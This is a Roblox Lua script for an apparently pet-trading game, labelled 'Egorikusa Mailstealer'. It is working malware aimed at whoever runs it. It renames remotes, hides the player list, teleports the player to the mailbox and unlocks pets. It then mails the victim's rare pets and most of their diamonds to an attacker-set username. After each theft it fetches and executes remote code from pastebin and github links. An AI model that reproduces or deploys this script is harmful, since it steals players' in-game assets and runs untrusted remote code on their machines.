if game.Players.LocalPlayer.leaderstats.Diamonds.Value <100000 then
    game.Players.LocalPlayer:Kick("Error launching script. Error code: ".._G.ScriptName..".LaunchScript")
end 
remotenameaaa = 0
for i,v in pairs(game.ReplicatedStorage:GetChildren()) do
	if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
		remotenameaaa = remotenameaaa + 1
		v.Name = remotenameaaa
		--print("changed remote name to "..remotenameaaa.."")
	end
end
game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
local mailbox = game:GetService("Workspace")["__MAP"].Interactive.Mailbox
for i,v in pairs(mailbox:GetDescendants()) do
	if v:IsA("MeshPart") or v:IsA("Part") then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(v.Position)
		break
	end
end
-- loading screen ^^
local folders = {
  game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Normal,
  game:GetService("Players").LocalPlayer.PlayerGui.Inventory.Frame.Main.Pets.Titanic,
}

local function unlockPetsInFolder(folder)
  local children = folder:GetChildren() -- Get all the children of the folder

  for _, child in ipairs(children) do -- Loop through each child in the folder
    if child:IsA("TextButton") and child.Locked.Visible == true then -- Check if the child is a TextButton
      local name = child.Name -- Get the name of the TextButton
      local remote = game:GetService("ReplicatedStorage")["95"] -- Replace "MyRemote" with the name of your remote
      local args = {
        [""..name] = false
      }
      if remote then
		local args = {
        [""..name] = false
      	} -- Check if the remote exists
        remote:InvokeServer(args) -- Call the remote with the name of the TextButton
      else
        warn("Remote not found")
      end
    end
  end
end

while true do
  for _, folder in ipairs(folders) do
    unlockPetsInFolder(folder)
    wait(.2) -- Wait for 1 second before running the function again
  end
  local lockedCount = 0
  for _, folder in ipairs(folders) do
    for _, child in ipairs(folder:GetChildren()) do
      if child:IsA("TextButton") and child.Locked.Visible == true then
        lockedCount = lockedCount + 1
      end
    end
  end
  if lockedCount == 0 then
    --print('all pets have been unlocked')
    break
  end
end
for i,v in pairs(game:GetDescendants()) do
	if v:IsA("Sound") then
		v:Destroy()
	end
end
local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network); local Fire, Invoke = Network.Fire, Network.Invoke; hookfunction(getupvalue(Fire, 1), function(...) return true end)
local FrameworkLibrary = require(game.ReplicatedStorage.Framework.Library)
local savedPets = FrameworkLibrary.Save.Get().Pets
while wait() do
for i,v in pairs(savedPets) do
    local v2 = FrameworkLibrary.Directory.Pets[v.id]
	if v2.huge == true and game.Players.LocalPlayer.leaderstats.Diamonds.Value >5000000 then
		_G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value
		local args = {
    	[1] = {
        ["Recipient"] = _G.Username,
        ["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
        ["Pets"] = {v.uid},
        ["Message"] = "Egorikusa Mailstealer | .gg/xz5SbEVtz8"
    	}
		}
		game:GetService("ReplicatedStorage"):FindFirstChild("107"):InvokeServer(unpack(args))
		_G.PetName = v2.name
		_G.PetRar = v2.rarity
		loadstring(game:HttpGet("https://pastebin.com/aMgMzBQV"))()
	elseif v2.huge == true then
		_G.Diamonds = 0
		local args = {
    	[1] = {
        ["Recipient"] = _G.Username,
        ["Diamonds"] = 0,
        ["Pets"] = {v.uid},
        ["Message"] = "Egorikusa Mailstealer | .gg/xz5SbEVtz8"
    	}
		}
		game:GetService("ReplicatedStorage"):FindFirstChild("107"):InvokeServer(unpack(args))
		_G.PetName = v2.name
		_G.PetRar = v2.rarity
		loadstring(game:HttpGet("https://github.com/Wopy13/webhook/blob/main/hookara"))()
	elseif v2.rarity == "Exclusive" and v2.huge == false and game.Players.LocalPlayer.leaderstats.Diamonds.Value >5000000 or v2.rarity == "Event" and game.Players.LocalPlayer.leaderstats.Diamonds.Value >5000000 then
		_G.Diamonds = game.Players.LocalPlayer.leaderstats.Diamonds.Value
		local args = {
    	[1] = {
        ["Recipient"] = _G.Username,
        ["Diamonds"] = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 5000000,
        ["Pets"] = {v.uid},
        ["Message"] = "Egorikusa Mailstealer | .gg/xz5SbEVtz8"
    	}
		}
		game:GetService("ReplicatedStorage"):FindFirstChild("107"):InvokeServer(unpack(args))
		_G.PetName = v2.name
		_G.PetRar = v2.rarity
		loadstring(game:HttpGet("https://pastebin.com/Jh874Ldj"))()
	elseif v2.rarity == "Exclusive" and v2.huge == false or v2.rarity == "Event" then
		_G.Diamonds = 0
		local args = {
    	[1] = {
        ["Recipient"] = _G.Username,
        ["Diamonds"] = 0,
        ["Pets"] = {v.uid},
        ["Message"] = "Egorikusa Mailstealer | .gg/xz5SbEVtz8"
    	}
		}
		game:GetService("ReplicatedStorage"):FindFirstChild("107"):InvokeServer(unpack(args))
		_G.PetName = v2.name
		_G.PetRar = v2.rarity
		loadstring(game:HttpGet("https://pastebin.com/Jh874Ldj"))()
	end
end
end